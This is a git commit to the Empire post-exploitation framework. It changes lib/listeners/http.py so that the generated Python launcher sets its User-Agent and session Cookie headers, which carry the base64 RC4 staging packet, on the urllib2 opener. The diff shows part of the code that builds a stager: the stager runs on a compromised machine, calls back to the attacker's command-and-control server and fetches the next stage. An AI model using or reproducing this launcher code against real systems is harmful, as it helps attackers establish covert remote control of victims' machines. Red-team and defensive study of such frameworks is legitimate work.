603a6f0900a7a97e2164b7a9a1f86d656d522b76
mw3demo <mw3demo@users.noreply.github.com>
2018-08-24 04:31:04 +0000

    Update http.py
    Same issue that was in http_hop.py as described in:
    
    https://github.com/EmpireProject/Empire/issues/1053, fixed via https://github.com/EmpireProject/Empire/pull/1062/
    
    Fixes https://github.com/EmpireProject/Empire/issues/1210

--- lib/listeners/http.py
+++ lib/listeners/http.py
@@ -443,11 +443,6 @@ class Listener:
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
-                launcherBase += "req=urllib2.Request(server+t);\n"
-                # add the RC4 packet to a cookie
-                launcherBase += "req.add_header('User-Agent',UA);\n"
-                launcherBase += "req.add_header('Cookie',\"session=%s\");\n" % (b64RoutingPacket)
-
                 # Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
@@ -477,6 +472,11 @@ class Listener:
                         launcherBase += "o = urllib2.build_opener(proxy);\n"
                 else:
                     launcherBase += "o = urllib2.build_opener();\n"
+
+                launcherBase += "req=urllib2.Request(server+t);\n"
+                
+                # add the RC4 packet to a cookie
+                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
 
                 #install proxy and creds globally, so they can be used with urlopen.
                 launcherBase += "urllib2.install_opener(o);\n"
